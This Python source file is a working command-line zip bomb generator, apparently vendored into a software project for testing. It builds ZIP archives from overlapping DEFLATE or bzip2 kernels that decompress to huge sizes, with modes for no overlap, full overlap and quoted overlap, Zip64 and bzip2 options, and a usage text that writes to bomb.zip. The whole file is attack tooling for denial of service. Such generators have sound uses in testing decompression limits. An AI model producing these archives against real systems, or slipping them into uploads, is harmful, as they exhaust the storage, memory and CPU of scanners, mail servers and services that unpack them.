#!/usr/bin/env python3
#
# Copyright (c) 2020 The DAML Authors. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

# This code was originally released in the public domain (source: https://www.bamsoftware.com/hacks/zipbomb/)

import binascii
import bz2
import getopt
import struct
import sys
import zipfile


CHOSEN_BYTE = ord(b"a") # homage to 42.zip


# CRC-32 precomputation using matrices in GF(2). Similar to crc32_combine in
# zlib. See https://stackoverflow.com/a/23126768 for a description of the idea.
# Here, we use a 33-bit state where the dummy 33rd coordinate is always 1
# (similar to homogeneous coordinates). Matrices are represented as 33-element
# lists, where each element is a 33-bit integer representing one column.

CRC_POLY = 0xedb88320

def matrix_mul_vector(m, v):
    r = 0
    for shift in range(len(m)):
        if (v>>shift) & 1 == 1:
            r ^= m[shift]
    return r

def matrix_mul(a, b):
    assert len(a) == len(b)
    return [matrix_mul_vector(a, v) for v in b]

def identity_matrix():
    return [1<<shift for shift in range(33)]

# Matrix that updates CRC-32 state for a 0 bit.
CRC_M0 = [CRC_POLY] + [1<<shift for shift in range(31)] + [1<<32]
# Matrix that flips the LSb (x^31 in the polynomial).
CRC_MFLIP = [1<<shift for shift in range(32)] + [(1<<32) + 1]
# Matrix that updates CRC-32 state for a 1 bit: flip the LSb, then act as for a 0 bit.
CRC_M1 = matrix_mul(CRC_M0, CRC_MFLIP)

def precompute_crc_matrix(data):
    m = identity_matrix()
    for b in data:
        for shift in range(8):
            m = matrix_mul([CRC_M0, CRC_M1][(b>>shift)&1], m)
    return m

def precompute_crc_matrix_repeated(data, n):
    accum = precompute_crc_matrix(data)
    # Square-and-multiply algorithm to compute m = accum^n.
    m = identity_matrix()
    while n > 0:
        if n & 1 == 1:
            m = matrix_mul(m, accum)
        accum = matrix_mul(accum, accum)
        n >>= 1
    return m

def crc_matrix_apply(m, value=0):
    return (matrix_mul_vector(m, (value^0xffffffff)|(1<<32)) & 0xffffffff) ^ 0xffffffff


# DEFLATE stuff, see RFC 1951.

class BitBuffer:
    def __init__(self):
        self.done = []
        self.current = 0
        self.bit_pos = 0

    def push(self, x, n):
        assert x == x % (1<<n), (bin(x), n)
        while n >= (8 - self.bit_pos):
            self.current |= (x << self.bit_pos) & 0xff
            x >>= (8 - self.bit_pos)
            n -= (8 - self.bit_pos)
            self.done.append(self.current)
            self.current = 0
            self.bit_pos = 0
        self.current |= (x << self.bit_pos) & 0xff
        self.bit_pos += n

    def push_rev(self, x, n):
        mask = (1<<n)>>1
        while mask > 0:
            self.push(x&mask != 0 and 1 or 0, 1)
            mask >>= 1

    def bytes(self):
        out = bytes(self.done)
        if self.bit_pos != 0:
            out += bytes([self.current])
        return out

# RFC 1951 section 3.2.2. Input is a sym: length dict and output is a
# sym: (code, length) dict.
def huffman_codes_from_lengths(sym_lengths):
    bl_count = {}
    max_length = 0
    for _, length in sym_lengths.items():
        bl_count.setdefault(length, 0)
        bl_count[length] += 1
        max_length = max(max_length, length)

    next_code = {}
    code = 0
    for length in range(max_length):
        code = (code + bl_count.get(length, 0)) << 1
        next_code[length+1] = code

    result = {}
    for sym, length in sorted(sym_lengths.items(), key=lambda x: (x[1], x[0])):
        assert next_code[length] >> length == 0, (sym, bin(next_code[length]), length)
        result[sym] = next_code[length], length
        next_code[length] += 1
    return result

def print_huffman_codes(sym_codes, **kwargs):
    max_sym_length = max(len("{}".format(sym)) for sym in sym_codes)
    for sym, code in sorted(sym_codes.items()):
        code, length = code
        print("{:{}}: {:0{}b}".format(sym, max_sym_length, code, length), **kwargs)

# RFC 1951 section 3.2.5. Returns a tuple (code, extra_bits, num_extra_bits).
def code_for_length(length):
    if length < 3:
        return None, None, None
    elif length < 11:
        base_code, base_length, num_bits = 257, 3, 0
    elif length < 19:
        base_code, base_length, num_bits = 265, 11, 1
    elif length < 35:
        base_code, base_length, num_bits = 269, 19, 2
    elif length < 67:
        base_code, base_length, num_bits = 273, 35, 3
    elif length < 131:
        base_code, base_length, num_bits = 277, 67, 4
    elif length < 258:
        base_code, base_length, num_bits = 281, 131, 5
    else:
        raise ValueError(length)
    return base_code + ((length - base_length) >> num_bits), (length - base_length) & ((1<<num_bits)-1), num_bits

# DEFLATE a string of a single repeated byte. Runs in two modes, depending on
# whether you provide compressed_size or max_uncompressed_size.
# compressed_size: decompresses to as many bytes as possible given an exact
# compressed length.
# max_uncompressed_size: decompresses to no more than the given number of bytes,
# but as close as possible.
# Returns a tuple (compressed_data, uncompressed_size, crc_matrix).
def bulk_deflate(repeated_byte, compressed_size=None, max_uncompressed_size=None, final=1):
    assert (compressed_size is None and max_uncompressed_size is not None) or (compressed_size is not None and max_uncompressed_size is None)

    # Huffman tree for code lengths.
    code_length_lengths = {
         0: 2,
         1: 3,
         2: 3,
        18: 1,
    }
    code_length_codes = huffman_codes_from_lengths(code_length_lengths)
    # print_huffman_codes(code_length_codes, file=sys.stderr)

    # Huffman tree for literal/length values.
    ll_lengths = {
        repeated_byte: 2, # literal byte
                  256: 2, # end of stream
                  285: 1, # copy 285 bytes
    }
    ll_codes = huffman_codes_from_lengths(ll_lengths)
    # print_huffman_codes(ll_codes, file=sys.stderr)

    # Huffman tree for distance codes.
    distance_lengths = {
        0: 1,   # distance 1
    }
    distance_codes = huffman_codes_from_lengths(distance_lengths)
    # print_huffman_codes(distance_codes, file=sys.stderr)

    bits = BitBuffer()
    # BFINAL
    bits.push(0b1, final and 1 or 0)
    # BTYPE=10: dynamic Huffman codes
    bits.push(0b10, 2)
    # HLIT is 257 less than the number of literal/length codes
    bits.push(max(ll_lengths) + 1 - 257, 5)
    # HDIST is 1 less than the number of distance codes
    bits.push(max(distance_lengths) + 1 - 1, 5)
    # HCLEN is 4 less than the number of code length codes
    CODE_LENGTH_ALPHABET = (16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15)
    num_code_length_codes = max(CODE_LENGTH_ALPHABET.index(sym) for sym in code_length_lengths) + 1
    bits.push(num_code_length_codes - 4, 4)

    # Output Huffman tree for code lengths.
    for code_length in CODE_LENGTH_ALPHABET[:num_code_length_codes]:
        bits.push(code_length_lengths.get(code_length, 0), 3)

    # Skip n literal/length slots. Assumes we have length codes for 0 and 18.
    def skip(n):
        while n >= 11:
            if n < 138:
                x = n
            elif n < 138 + 11 and code_length_lengths[18] < (n - 138) * code_length_lengths[0]:
                # It'll be cheaper to cut this 18 block short and do the
                # remainder with another full 18 block.
                x = n - 11
            else:
                x = 138
            bits.push_rev(*code_length_codes[18]) # 7 bits of length to follow
            bits.push(x - 11, 7)
            n -= x
        while n > 0:
            bits.push_rev(*code_length_codes[0])
            n -= 1
    # Output a Huffman tree in terms of code lengths.
    def output_code_length_tree(sym_lengths):
        cur = 0
        for sym, length in sorted(sym_lengths.items()):
            skip(sym - cur)
            bits.push_rev(*code_length_codes[length])
            cur = sym + 1

    # Output Huffman tree for literal/length values.
    output_code_length_tree(ll_lengths)

    # Output Huffman tree for distance codes.
    output_code_length_tree(distance_lengths)

    n = 0
    # A literal byte to start the whole process.
    bits.push_rev(*ll_codes[repeated_byte])
    n += 1

    # Now every pair of 0 bits encodes 258 copies of repeated_byte.
    is_even = bits.bit_pos % 2 == 0
    # Including whatever zero bits remain at the end of the bit buffer.
    n += (8 - bits.bit_pos + 1) // 2 * 258

    prefix = bits.bytes()

    bits = BitBuffer()
    if not is_even:
        bits.push(*distance_codes[0])
    if max_uncompressed_size is not None:
        # Push bytes to get within 258 of the max we are allowed.
        while (max_uncompressed_size - n) % 1032 >= 258:
            bits.push_rev(*ll_codes[285])
            bits.push(*distance_codes[0])
            n += 258
    else:
        # Push the stream-end code (256) as far back in the byte as possible.
        while bits.bit_pos + ll_lengths[285] + distance_lengths[0] + ll_lengths[256] <= 8:
            bits.push_rev(*ll_codes[285])
            bits.push(*distance_codes[0])
            n += 258
    bits.push_rev(*ll_codes[256])
    suffix = bits.bytes()

    if max_uncompressed_size is not None:
        num_zeroes = (max_uncompressed_size - n) // 1032
    else:
        num_zeroes = compressed_size - len(prefix) - len(suffix)

    n += num_zeroes * 1032
    body = b"\x00" * num_zeroes

    compressed_data = prefix + body + suffix

    if max_uncompressed_size is not None:
        assert (max_uncompressed_size - n) < 258, (n, max_uncompressed_size)
    else:
        assert len(compressed_data) == compressed_size, (len(compressed_data), compressed_size)

    return compressed_data, n, precompute_crc_matrix_repeated(bytes([repeated_byte]), n)


# bzip2 stuff

def bulk_bzip2(repeated_byte, compressed_size=None, max_uncompressed_size=None):
    assert (compressed_size is None and max_uncompressed_size is not None) or (compressed_size is not None and max_uncompressed_size is None)

    # 45899235, empirically determined to be the largest amount of data that
    # fits into a 900 kB block after the initial bzip2 RLE (each 255 bytes
    # becomes 5 bytes; 45899235 * 5 / 255 = 899985).
    # https://en.wikipedia.org/w/index.php?title=Bzip2&oldid=890453143#File_format
    # says it can fit 45899236, 1 byte more, but in my tests that results in a
    # second block being emitted.
    block_uncompressed_size = 45899235

    # Use an actual bzip2 implementation to compress the entire stream, then
    # extract from it a single block that we will repeat. This is actually
    # bogus, because whatever follows the block header is not necessarily
    # byte-aligned, but the assertions will prevent going ahead if things don't
    # work out perfectly.
    basic = bz2.compress(bytes([repeated_byte])*block_uncompressed_size, 9)
    assert len(basic) == 46, basic
    header, block, footer, _ = basic[0:4], basic[4:36], basic[36:42], basic[42:]
    assert header == b"BZh9", header
    assert block.startswith(b"\x31\x41\x59\x26\x53\x59"), block
    assert footer == b"\x17\x72\x45\x38\x50\x90", header
    block_crc, = struct.unpack(">L", block[6:10])

    if compressed_size is not None:
        num_blocks = (compressed_size - 4 - 10) // 32
        assert (compressed_size - 4 - 10) % 32 == 0
    else:
        num_blocks = max_uncompressed_size // block_uncompressed_size
    n = num_blocks * block_uncompressed_size
    # 2.2.4 https://github.com/dsnet/compress/blob/master/doc/bzip2-format.pdf
    stream_crc = 0
    for i in range(num_blocks):
        stream_crc = (block_crc ^ ((stream_crc<<1) | (stream_crc>>31))) & 0xffffffff

    crc_matrix = precompute_crc_matrix_repeated(bytes([repeated_byte]), n)
    compressed_data = header + block*num_blocks + footer + struct.pack(">L", stream_crc)
    return compressed_data, n, crc_matrix


# APPNOTE.TXT 4.4.5
# 8 - The file is Deflated
COMPRESSION_METHOD_DEFLATE = 8
# 12 - File is compressed using BZIP2 algorithm
COMPRESSION_METHOD_BZIP2 = 12

BULK_COMPRESS = {
    COMPRESSION_METHOD_BZIP2: bulk_bzip2,
    COMPRESSION_METHOD_DEFLATE: bulk_deflate,
}

# APPNOTE.TXT 4.4.3.2
# 2.0 - File is compressed using Deflate compression
ZIP_VERSION = 20
# 4.5 - File uses ZIP64 format extensions
ZIP64_VERSION = 45
# 4.6 - File is compressed using BZIP2 compression
ZIP_BZIP2_VERSION = 46

MOD_DATE = 0x0548
MOD_TIME = 0x6ca0

def zip_version(compression_method=COMPRESSION_METHOD_DEFLATE, zip64=False):
    candidates = [ZIP_VERSION]
    if compression_method == COMPRESSION_METHOD_BZIP2:
        candidates.append(ZIP_BZIP2_VERSION)
    if zip64:
        candidates.append(ZIP64_VERSION)
    return max(candidates)

# In Zip64 mode, we add a Zip64 extra field for every file (including using
# ZIP64_VERSION instead of ZIP_VERSION) for *every* file, whether it is large
# enough to need it or not. Past a certain threshold, every file *does* need it
# anyway. It may be slightly better for compatibility to write every file in
# either Zip64 or non-Zip64 mode. See the block comment in putextended in
# zipfile.c of Info-ZIP Zip 3.0 (though the worst incompatibility has to do with
# data descriptors, which we don't use).
#
# Even in Zip64 mode, we make the assumption that the only field that needs to
# be represented in the Zip64 extra info is uncompressed_size, and not
# compressed_size nor local_file_header_offset (checked with an assertion in
# CentralDirectoryHeader.serialize). This is to make analysis easier (central
# directory headers and local file headers continue to have a fixed size), and
# because the zip file has to be really big for either of those fields to exceed
# 4 GiB—the quoted_overlap method can produce a zip file whose total unzipped
# size is greater than 16 EiB (2^64 bytes) without exceeding either of those
# limits.

class LocalFileHeader:
    def __init__(self, compressed_size, uncompressed_size, crc, filename, compression_method=COMPRESSION_METHOD_DEFLATE, extra_tag=None, extra_length_excess=0):
        self.compressed_size = compressed_size
        self.uncompressed_size = uncompressed_size
        self.crc = crc
        self.filename = filename
        self.compression_method = compression_method
        self.extra_tag = extra_tag
        self.extra_length_excess = extra_length_excess

    def serialize(self, zip64=False):
        # APPNOTE.TXT 4.5.3 says that in the local file header, unlike the
        # central directory header, we must include both uncompressed_size and
        # compressed_size in the Zip64 extra field, even if one of them is not
        # so big as to require Zip64.
        extra = b""
        if zip64:
            extra += struct.pack("<HHQQ",
                0x0001, # tag type (Zip64)
                16,     # tag size
                self.uncompressed_size, # uncompressed size
                self.compressed_size,   # compressed size
            )
        if self.extra_length_excess > 0:
            extra += struct.pack("<HH", self.extra_tag, self.extra_length_excess)

        # APPNOTE.TXT 4.3.7
        return struct.pack("<LHHHHHLLLHH",
            0x04034b50, # signature
            zip_version(self.compression_method, zip64), # version needed to extract
            0,          # flags
            self.compression_method,    # compression method
            MOD_TIME,   # modification time
            MOD_DATE,   # modification date
            self.crc,   # CRC-32
            zip64 and 0xffffffff or self.compressed_size,     # compressed size
            zip64 and 0xffffffff or self.uncompressed_size,   # uncompressed size
            len(self.filename),     # filename length
            len(extra) + self.extra_length_excess,  # extra length
        ) + self.filename + extra

class CentralDirectoryHeader:
    # template is a LocalFileHeader instance.
    def __init__(self, local_file_header_offset, template):
        self.local_file_header_offset = local_file_header_offset
        self.compressed_size = template.compressed_size
        self.uncompressed_size = template.uncompressed_size
        self.crc = template.crc
        self.filename = template.filename
        self.compression_method = template.compression_method

    def serialize(self, zip64=False):
        # Even in Zip64 mode, we assume that the only field that needs to be
        # represented in the Zip64 extra field is uncompressed_size.
        #
        # Also, we set the threshold for compressed_size and
        # local_file_header_offset at 0xfffffffe rather than 0xffffffff because
        # Go archive/zip which (wrongly, IMO) requires a Zip64 extra field to be
        # present when either of the two latter fields is exactly 0xffffffff.
        # https://github.com/golang/go/issues/31692
        assert self.compressed_size <= 0xfffffffe, self.compressed_size
        assert self.local_file_header_offset <= 0xfffffffe, self.local_file_header_offset

        extra = b""
        if zip64:
            extra += struct.pack("<HHQ",
                0x0001, # tag type (Zip64)
                8,      # tag size
                self.uncompressed_size, # uncompressed size
            )

        # APPNOTE.TXT 4.3.12
        return struct.pack("<LHHHHHHLLLHHHHHLL",
            0x02014b50, # signature
            (0<<8) | zip_version(self.compression_method, zip64),   # version made by (0 - MS-DOS/FAT compatible)
            zip_version(self.compression_method, zip64),            # version needed to extract
            0,          # flags
            self.compression_method,    # compression method
            MOD_TIME,   # modification time
            MOD_DATE,   # modification date
            self.crc,   # CRC-32
            self.compressed_size,   # compressed size
            zip64 and 0xffffffff or self.uncompressed_size,   # uncompressed size
            len(self.filename),     # filename length
            len(extra), # extra length
            0,          # file comment length
            0,          # disk number where file starts
            0,          # internal file attributes
            0,          # external file attributes
            self.local_file_header_offset,  # offset of local file header
        ) + self.filename + extra

class EndOfCentralDirectory:
    def __init__(self, cd_num_entries, cd_size, cd_offset):
        self.cd_num_entries = cd_num_entries
        self.cd_size = cd_size
        self.cd_offset = cd_offset

    def serialize(self, zip64=False, compression_method=COMPRESSION_METHOD_DEFLATE):
        result = []
        if zip64:
            # APPNOTE.TXT 4.3.14 Zip64 end of central directory record
            # We use the "Version 1" Zip64 EOCD (Zip version 4.5). "Version 2"
            # would be indicated by a Zip version of 6.2 or greater. APPNOTE.TXT
            # 7.3.3: "The layout of the Zip64 End of Central Directory record
            # for all versions starting with 6.2 of this specification will
            # follow the Version 2 format."
            result.append(struct.pack("<LQHHLLQQQQ",
                0x06064b50, # signature
                44,         # size of remainder of Zip64 EOCD
                zip_version(compression_method, zip64), # version made by
                zip_version(compression_method, zip64), # version needed to extract
                0,          # number of this disk
                0,          # disk of central directory
                self.cd_num_entries,    # number of central directory entries on this disk
                self.cd_num_entries,    # number of central directory entries total
                self.cd_size,   # size of central directory
                self.cd_offset, # offset to central directory
            ))
            # APPNOTE.TXT 4.3.15 Zip64 end of central directory locator
            result.append(struct.pack("<LLQL",
                0x07064b50, # signature
                0,          # number of disk with Zip64 EOCD
                self.cd_size + self.cd_offset,  # offset of Zip64 EOCD
                1,          # total number of disks
            ))
        # APPNOTE.TXT 4.3.16 End of central directory record
        result.append(struct.pack("<LHHHHLLH",
            0x06054b50, # signature
            0,          # number of this disk
            0,          # disk of central directory
            zip64 and 0xffff or self.cd_num_entries,    # number of central directory entries on this disk
            zip64 and 0xffff or self.cd_num_entries,    # number of central directory entries total
            zip64 and 0xffffffff or self.cd_size,       # size of central directory
            zip64 and 0xffffffff or self.cd_offset,     # offset of central directory
            0,          # comment length
        ))
        return b"".join(result)


FILENAME_ALPHABET = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
def filename_for_index(i):
    letters = []
    while True:
        letters.insert(0, FILENAME_ALPHABET[i % len(FILENAME_ALPHABET)])
        i = i // len(FILENAME_ALPHABET) - 1
        if i < 0:
            break
    return bytes(letters)

def write_zip_no_overlap(f, num_files, compressed_size=None, max_uncompressed_size=None, compression_method=COMPRESSION_METHOD_DEFLATE, zip64=False, template=[], **kwargs):
    kernel, n, crc_matrix = BULK_COMPRESS[compression_method](CHOSEN_BYTE, compressed_size=compressed_size, max_uncompressed_size=max_uncompressed_size)
    central_directory = []
    offset = 0

    for file, compressed_data in template:
        central_directory.append(CentralDirectoryHeader(offset, file))
        offset += f.write(file.serialize(zip64=zip64))
        offset += f.write(compressed_data)

    for i in range(num_files):
        file = LocalFileHeader(len(kernel), n, crc_matrix_apply(crc_matrix), filename_for_index(i), compression_method=compression_method)
        central_directory.append(CentralDirectoryHeader(offset, file))
        offset += f.write(file.serialize(zip64=zip64))
        offset += f.write(kernel)

    cd_offset = offset
    for cd_header in central_directory:
        offset += f.write(cd_header.serialize(zip64=zip64))
    cd_size = offset - cd_offset

    offset += f.write(EndOfCentralDirectory(len(central_directory), cd_size, cd_offset).serialize(zip64=zip64, compression_method=compression_method))

    return offset

def write_zip_full_overlap(f, num_files, compressed_size=None, max_uncompressed_size=None, compression_method=COMPRESSION_METHOD_DEFLATE, zip64=False, template=[], **kwargs):
    kernel, n, crc_matrix = BULK_COMPRESS[compression_method](CHOSEN_BYTE, compressed_size=compressed_size, max_uncompressed_size=max_uncompressed_size)
    central_directory = []
    offset = 0

    for file, compressed_data in template:
        central_directory.append(CentralDirectoryHeader(offset, file))
        offset += f.write(file.serialize(zip64=zip64))
        offset += f.write(compressed_data)

    main_crc = crc_matrix_apply(crc_matrix)
    main_file = LocalFileHeader(len(kernel), n, main_crc, filename_for_index(0), compression_method=compression_method)
    main_file_offset = offset
    offset += f.write(main_file.serialize(zip64=zip64))
    offset += f.write(kernel)

    cd_offset = offset
    for cd_header in central_directory:
        offset += f.write(cd_header.serialize(zip64=zip64))
    for i in range(num_files):
        cd_header = CentralDirectoryHeader(main_file_offset, main_file)
        cd_header.filename = filename_for_index(i)
        offset += f.write(cd_header.serialize(zip64=zip64))
    cd_size = offset - cd_offset

    offset += f.write(EndOfCentralDirectory(len(central_directory)+num_files, cd_size, cd_offset).serialize(compression_method=compression_method, zip64=zip64))

    return offset

# Optimization: cache calls to precompute_crc_matrix_repeated.
crc_matrix_cache = {}
def memo_crc_matrix_repeated(data, n):
    val = crc_matrix_cache.get((data, n))
    if val is not None:
        return val
    val = precompute_crc_matrix_repeated(b"\x00", n)
    crc_matrix_cache[(data, n)] = val
    return val

# Compute the CRC of prefix+remainder, given the CRC of prefix, the CRC of
# remainder, and a matrix that computes the effect of len(remainder) 0x00 bytes.
#
# Basically it's the xor of crc32(remainder) and crc32(prefix + zeroes), where
# the latter quantity is the result of applying the matrix to crc32(prefix).
def crc_combine(crc_prefix, crc_remainder, crc_matrix_zeroes):
    # Undo the pre- and post-conditioning that crc_matrix_apply does, because
    # crc_prefix and crc are already conditioned.
    return crc_matrix_apply(crc_matrix_zeroes, crc_prefix ^ 0xffffffff) ^ 0xffffffff ^ crc_remainder

def write_zip_quoted_overlap(f, num_files, compressed_size=None, max_uncompressed_size=None, compression_method=COMPRESSION_METHOD_DEFLATE, zip64=False, template=[], extra_tag=None, max_quoted=0):
    class FileRecord:
        def __init__(self, header, data, crc_matrix):
            self.header = header
            self.data = data
            self.crc_matrix = crc_matrix

    # Figure out how many files we can quote using the extra field.
    num_extra_length_files = 0
    if extra_tag is not None:
        sum = 0
        while sum <= 65535:
            sum += 30 + 4 + (zip64 and 20 or 0) + len(filename_for_index(num_extra_length_files+1))
            num_extra_length_files += 1
        num_extra_length_files -= 1

    # Compress the kernel.
    kernel, kernel_uncompressed_size, kernel_crc_matrix = BULK_COMPRESS[compression_method](CHOSEN_BYTE, compressed_size=compressed_size, max_uncompressed_size=max_uncompressed_size)
    header = LocalFileHeader(len(kernel), kernel_uncompressed_size, crc_matrix_apply(kernel_crc_matrix), filename_for_index(num_files-1), compression_method=compression_method)
    # An optimization compared to what's described in the paper is that our
    # accumulator matrix doesn't represent the bytes of the kernel and all the
    # preceding quoted local file headers, but just an equal number of 0x00
    # bytes. We track the running CRC along with the matrix and use that with
    # crc_combine to compute actual CRCs. This way is faster because we can
    # memoize most of the calls to precompute_crc_matrix_repeated(b"\x00", n)
    # because many local file headers share the same length.
    crc_matrix = precompute_crc_matrix_repeated(b"\x00", kernel_uncompressed_size)
    # Initialize the files list with a file containing the kernel.
    files = [FileRecord(header, kernel, crc_matrix)]

    # DEFLATE non-compressed block quoting, until there are few enough files
    # left to use extra field quoting.
    while compression_method == COMPRESSION_METHOD_DEFLATE and len(files) < num_files - num_extra_length_files:
        # See how subsequent local file headers (and their own quoting blocks)
        # we can quote here. Originally we only quoted the one originally
        # following header, but it's better to quote as much as we can, because
        # then we get a small bonus--5 bytes of output for each quoting header
        # we manage to include. The --giant-steps option activates this feature.
        # We don't want giant steps whenever we are trying to limit output file
        # sizes, as in zblg.zip, so that the smallest file (the file containing
        # the kernel) can be as large as possible.
        # Whatever the limit, we always need to quote at least one header in
        # order to make the construction work.
        header_bytes = files[0].header.serialize(zip64=zip64)
        num_quoted = len(header_bytes)
        crc_quoted = binascii.crc32(header_bytes)
        next_file = files[0]
        for i in range(1, len(files)):
            file_i_header = files[i].header.serialize(zip64=zip64)
            if num_quoted + len(files[i-1].data) + len(file_i_header) > max_quoted:
                break
            num_quoted += len(files[i-1].data) + len(file_i_header)
            crc_quoted = binascii.crc32(files[i-1].data, crc_quoted)
            crc_quoted = binascii.crc32(file_i_header, crc_quoted)
            next_file = files[i]

        # Find the CRC that results from prepending next_header_bytes to the
        # following files, whose CRC we already know.
        new_crc = crc_combine(crc_quoted, next_file.header.crc, next_file.crc_matrix)
        # Accumulate len(next_header_bytes) additional 0x00 bytes into crc_matrix.
        new_crc_matrix = matrix_mul(next_file.crc_matrix, memo_crc_matrix_repeated(b"\x00", num_quoted))

        # Place a non-final non-compressed DEFLATE block (BFINAL=0, BTYPE=00)
        # that quotes up to and including the header of next_file, and joins up
        # with the DEFLATE stream that it contains.
        quote = struct.pack("<BHH", 0x00, num_quoted, num_quoted ^ 0xffff)
        header = LocalFileHeader(
            len(quote) + num_quoted + next_file.header.compressed_size,
            num_quoted + next_file.header.uncompressed_size,
            new_crc,
            filename_for_index(num_files - len(files) - 1),
            compression_method=compression_method,
        )
        files.insert(0, FileRecord(header, quote, new_crc_matrix))
    # Extra-field quoting.
    while len(files) < num_files:
        next_file = files[0]
        next_header_bytes = next_file.header.serialize(zip64=zip64)
        header = LocalFileHeader(
            next_file.header.compressed_size,
            next_file.header.uncompressed_size,
            next_file.header.crc,
            filename_for_index(num_files - len(files) - 1),
            compression_method=compression_method,
            extra_tag=extra_tag,
            extra_length_excess=len(next_header_bytes) + next_file.header.extra_length_excess,
        )
        files.insert(0, FileRecord(header, b"", next_file.crc_matrix))

    for header, data in reversed(template):
        files.insert(0, FileRecord(header, data))

    central_directory = []
    offset = 0
    for record in files:
        central_directory.append(CentralDirectoryHeader(offset, record.header))
        offset += f.write(record.header.serialize(zip64=zip64))
        offset += f.write(record.data)

    cd_offset = offset
    for cd_header in central_directory:
        offset += f.write(cd_header.serialize(zip64=zip64))
    cd_size = offset - cd_offset

    offset += f.write(EndOfCentralDirectory(len(central_directory), cd_size, cd_offset).serialize(compression_method=compression_method, zip64=zip64))

    return offset

def load_template(filename):
    result = []
    with open(filename, "rb") as f:
        with zipfile.ZipFile(filename) as z:
            for info in z.infolist():
                lfh = LocalFileHeader(info.compress_size, info.file_size, info.CRC, info.filename.encode("cp437"), info.compress_type)
                f.seek(info.header_offset+26)
                filename_length, extra_length = struct.unpack("<HH", f.read(4))
                f.seek(filename_length + extra_length, 1)
                data = f.read(info.compress_size)
                result.append((lfh, data))
    return result

def usage(file=sys.stdout):
    print("""Usage:
  {program_name} --num-files=N --compressed-size=N [OPTIONS...] > bomb.zip
  {program_name} --num-files=N --max-uncompressed-size=N [OPTIONS...] > bomb.zip

The --num-files option and either the --compressed-size or
--max-uncompressed-size options are required.

  --algorithm=ALG   ALG can be "deflate" (default) or "bzip2"
  --alphabet=CHARS  alphabet for constructing filenames
  --compressed-size=N  compressed size of the kernel
  --extra=HHHH      use extra-field quoting with the type tag 0xHHHH
  --giant-steps     quote as many headers as possible, not just one
  --max-uncompressed-size=N  maximum uncompressed size of the kernel
  --mode=MODE       "no_overlap", "full_overlap", or "quoted_overlap" (default)
  --num-files=N     number of files to contain, not counting template files
  --template=ZIP    zip file containing other files to store in the zip bomb
  --zip64           enable Zip64 extensions\
""".format(program_name=sys.argv[0]), file=file)

def main():
    opts, args = getopt.gnu_getopt(sys.argv[1:], "h", [
        "algorithm=",
        "alphabet=",
        "compressed-size=",
        "extra=",
        "giant-steps",
        "help",
        "max-uncompressed-size=",
        "mode=",
        "num-files=",
        "template=",
        "zip64",
    ])
    assert not args, args
    global FILENAME_ALPHABET
    mode = write_zip_quoted_overlap
    compression_method = COMPRESSION_METHOD_DEFLATE
    compressed_size = None
    giant_steps = False
    max_uncompressed_size = None
    extra_tag = None
    template_filenames = []
    zip64 = False
    for o, a in opts:
        if o == "--algorithm":
            compression_method = {
                "bzip2": COMPRESSION_METHOD_BZIP2,
                "deflate": COMPRESSION_METHOD_DEFLATE,
            }[a]
        elif o == "--alphabet":
            assert len(set(sorted(a))) == len(a), a
            FILENAME_ALPHABET = bytes(a, "utf-8")
        elif o == "--compressed-size":
            compressed_size = int(a)
        elif o == "--extra":
            # This is an experimental feature that quotes as many files as
            # possible inside the Extra Field of local file headers, rather than
            # quoting using DEFLATE non-compressed blocks. The argument is a
            # 16-bit hexadecimal tag ID. It should be possible to use any tag ID
            # that's unallocated in APPNOTE.TXT 4.5.2.
            extra_tag = int(a, 16)
        elif o == "--giant-steps":
            giant_steps = True
        elif o == "--max-uncompressed-size":
            max_uncompressed_size = int(a)
        elif o == "--mode":
            mode = {
                "no_overlap": write_zip_no_overlap,
                "full_overlap": write_zip_full_overlap,
                "quoted_overlap": write_zip_quoted_overlap,
            }[a]
        elif o == "--num-files":
            num_files = int(a)
        elif o == "--template":
            template_filenames.append(a)
        elif o == "--zip64":
            zip64 = True
        elif o in ("-h", "--help"):
            usage()
            sys.exit(1)

    if extra_tag is not None and mode != write_zip_quoted_overlap:
        print("--extra only makes sense with --mode=quoted_overlap", file=sys.stderr)
        sys.exit(1)
    if giant_steps and mode != write_zip_quoted_overlap:
        print("--giant-steps only makes sense with --mode=quoted_overlap", file=sys.stderr)
        sys.exit(1)
    max_quoted = 0
    if giant_steps:
        max_quoted = 0xffff

    template = []
    for filename in template_filenames:
        template.extend(load_template(filename))

    mode(sys.stdout.buffer, num_files, compressed_size=compressed_size, max_uncompressed_size=max_uncompressed_size, compression_method=compression_method, zip64=zip64, template=template, extra_tag=extra_tag, max_quoted=max_quoted)

if __name__ == "__main__":
    main()
